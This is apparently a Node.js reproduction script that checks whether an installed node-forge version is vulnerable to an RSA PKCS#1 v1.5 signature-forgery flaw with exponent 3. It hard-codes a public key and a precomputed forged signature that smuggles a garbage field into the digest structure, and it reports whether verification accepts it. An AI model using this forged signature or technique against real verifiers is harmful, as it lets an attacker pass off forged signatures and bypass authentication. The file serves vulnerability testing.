// Repro CVE-2026-85393 (GHSA-86w9-cpqp-85rv): nested DigestAlgorithm element
// count not validated during RSA PKCS#1 v1.5 verification -> signature forgery
// with low public exponent (e=3). Exits 0 when forged signature is REJECTED
// (fixed), exits 1 when it is ACCEPTED (vulnerable).
const path = require('path');
const forgePath = process.argv[2] || path.resolve('app/node_modules/node-forge');
const forge = require(forgePath);
const RSA = forge.pki.rsa;
const MD = forge.md;

const N = new forge.jsbn.BigInteger(
  'E932AC92252F585B3A80A4DD76A897C8B7652952FE788F6EC8DD640587A1EE56' +
  '47670A8AD4C2BE0F9FA6E49C605ADF77B5174230AF7BD50E5D6D6D6D28CCF0A8' +
  '86A514CC72E51D209CC772A52EF419F6A953F3135929588EBE9B351FCA61CED7' +
  '8F346FE00DBB6306E5C2A4C6DFC3779AF85AB417371CF34D8387B9B30AE46D7A' +
  '5FF5A655B8D8455F1B94AE736989D60A6F2FD5CADBFFBD504C5A756A2E6BB5CE' +
  'CC13BCA7503F6DF8B52ACE5C410997E98809DB4DC30D943DE4E812A47553DCE5' +
  '4844A78E36401D13F77DC650619FED88D8B3926E3D8E319C80C744779AC5D6AB' +
  'E252896950917476ECE5E8FC27D5F053D6018D91B502C4787558A002B9283DA7', 16);
const e = new forge.jsbn.BigInteger('3');
const publicKey = RSA.setPublicKey(N, e);

// garbage OCTET STRING as extra child inside nested DigestAlgorithm SEQUENCE
const S = forge.util.hexToBytes(
  'a4ae63dd5e7712b78f4870d0f51e294df5503d4f16c5d27ae33370981fb57f0de49f' +
  '50f3d6a04666774cd984cd13972db9bf8e12bd294ef0ddc916c7c86cbae63efd7b6b' +
  '97885e69760c208a40f1aecc76a90d7af5145177efce1bb55807a8d05c20b1596753' +
  'ba710642fc9acdde6c160232654662c77cc4466c8257a38edb49f894e8845d0fd987' +
  'b857ced88f4b62505a080bd87ef700d35d392a6e8f6fde34250c50b86fae606cb551' +
  '215e8f4813239b77651d5565ad453698c071d48c31e8e526fb4a37610f64b3e1fb8e' +
  '5be5898e408ad08197a0947794a530b54f84485377ce4a7488ed485ce4e5e105dd89' +
  '698a472f390c3b1b76bc16b73276c4d1c81d');

const md = MD.sha256.create();
md.update('hello world!');

let accepted = false;
try {
  accepted = publicKey.verify(md.digest().getBytes(), S, undefined, {
    _parseAllDigestBytes: true,
    _skipPaddingChecks: true,
  });
} catch (err) {
  console.log('verify threw:', err.message);
}

const version = require(path.join(forgePath, 'package.json')).version;
console.log(`node-forge ${version}: forged signature ${accepted ? 'ACCEPTED (VULNERABLE)' : 'rejected (fixed)'}`);
process.exit(accepted ? 1 : 0);
